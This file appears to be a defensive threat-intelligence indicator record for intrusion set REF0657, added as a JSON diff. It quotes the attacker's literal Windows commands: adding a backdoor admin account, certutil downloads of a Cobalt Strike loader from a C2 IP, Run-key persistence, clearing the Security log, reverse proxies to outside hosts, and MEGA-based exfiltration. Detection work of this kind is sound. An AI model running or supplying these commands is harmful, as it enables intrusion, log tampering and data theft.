@@ -1,0 +1,370 @@
+{
+  "malware_family": "REF0657",
+  "threat_actor": "REF0657",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "REF0657 is an intrusion set observed targeting a financial services organization, characterized by a 'smash-and-grab' style. The actor leveraged Microsoft SQL Server (xp_cmdshell) for initial execution, followed by a wide array of open-source tools for proxying, lateral movement, and credential dumping. The final payload was Cobalt Strike, delivered via DLL side-loading, with data exfiltration conducted using a masqueraded MEGA command-line utility.",
+  "mitre_techniques": [
+    "T1059.003",
+    "T1218",
+    "T1036",
+    "T1140",
+    "T1047",
+    "T1105",
+    "T1574.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "parent_child",
+      "value": "sqlservr.exe -> cmd.exe",
+      "context": "Abusing MSSQL xp_cmdshell stored procedure for command execution.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "echo net user helpdesk P@ssw0rd /add && net localgroup administrators helpdesk /add ^> \\\\127.0.0.1\\C$\\FOUGTZ 2^>^&1 > %TEMP%\\VOruiL.bat",
+      "context": "Creating a temporary batch file to add a local administrator user.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil -urlcache -split -f http://206.237.3.150:443/1.txt C:\\users\\public\\downloads\\msvcp140.dll",
+      "context": "Downloading the malicious sideload DLL for Cobalt Strike.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TrendMicro /t REG_SZ /d \"C:\\ProgramData\\McAfee\\TrendMicro\\ds_monitor.exe\" /f /reg:64",
+      "context": "Creating Run key persistence for the Cobalt Strike sideloading host.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f",
+      "context": "Enabling Restricted Admin mode for pass-the-hash attacks.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wevtutil.exe cl Security",
+      "context": "Wiping the Security event log.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "c:\\programdata\\AppLaunch.exe proxy -r 206.237.0.49:12355 >> 1.txt",
+      "context": "Executing the iox proxy tool via a legitimate .NET binary.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "iox",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Users\\Public\\Downloads\\ra.exe -d 149.104.23.176:80",
+      "context": "Executing the Rakshasa proxy tool to create a tunnel.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Rakshasa",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil -urlcache -split -f http://206.237.3.150:443/megacmd.exe C:\\users\\public\\downloads\\ms_edge.exe",
+      "context": "Downloading and renaming the MEGA Cmd utility.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ms_edge.exe --config C:\\users\\public\\downloads\\tmp copy REDACTED_FILENAME.bak mega_temp:",
+      "context": "Using renamed MEGA Cmd to exfiltrate a .bak file.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "MEGA Cmd",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "P@ssw0rd",
+      "context": "Hardcoded password for newly created 'helpdesk' user.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "helpdesk",
+      "context": "Username for newly created local administrator account.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\McAfee\\TrendMicro\\ds_monitor.exe",
+      "context": "Staging path for Trend Micro binary used for DLL side-loading.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ds_monitor.exe",
+      "context": "Legitimate Trend Micro binary used to side-load Cobalt Strike.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "msvcp140.dll",
+      "context": "Malicious DLL side-loaded to execute Cobalt Strike.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "config.ini",
+      "context": "File containing the base64-encoded Cobalt Strike beacon.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "qLVAMxSGzP",
+      "context": "Randomly named Windows service used for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "VOruiL.bat",
+      "context": "Temporary batch file created to add a local user.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "TrendMicro",
+      "context": "Value name for Run key persistence of Cobalt Strike loader.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\fDenyTSConnections",
+      "context": "Registry key modified to enable RDP.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "mscoree.dll",
+      "context": "Malicious DLL sideloaded to inject iox proxy shellcode.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\programdata\\mscoree.dll",
+      "context": "Location of malicious DLL used for iox proxy injection.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "c:\\users\\public\\downloads\\ra.exe",
+      "context": "Download path for Rakshasa proxy client.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ms_edge.exe",
+      "context": "Masqueraded filename for the MEGA Cmd utility (megacmd.exe).",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tmp",
+      "context": "Configuration file for the MEGA Cmd utility.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ASPXspy.aspx",
+      "context": "Web shell observed on C2 infrastructure.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "WebShell",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tunnel.ashx",
+      "context": "Neo-reGeorg web shell template observed on C2 infrastructure.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "Neo-reGeorg",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "msedge.one",
+      "context": "Cobalt Strike C2 domain loaded from config.ini.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "206.237.3.150",
+      "context": "File hosting and payload download C2.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "206.237.0.49",
+      "context": "File hosting, Supershell C2, and iox proxy target.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.21.54.126",
+      "context": "Cobalt Strike C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "149.104.23.176",
+      "context": "C2 for Rakshasa proxy tool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.237.3.150:443/1.txt",
+      "context": "Download URL for malicious msvcp140.dll (Cobalt Strike loader).",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.237.3.150:443/megacmd.exe",
+      "context": "Download URL for MEGA Cmd utility.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://206.237.0.49:8888",
+      "context": "Supershell C2 panel login page.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Supershell"
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "bc90ef8121d20af264cc15b38dd1c3a866bfe5a9eb66064feb2a00d860a0e716",
+      "description": "Malicious mscoree.dll used to inject iox proxy shellcode."
+    },
+    {
+      "sha256": "84b3bc58ec04ab272544d31f5e573c0dd7812b56df4fa445194e7466f280e16d",
+      "description": "Malicious MSASN1.dll used as a Cobalt Strike loader (same as msvcp140.dll)."
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "elf"
+  ]
+}
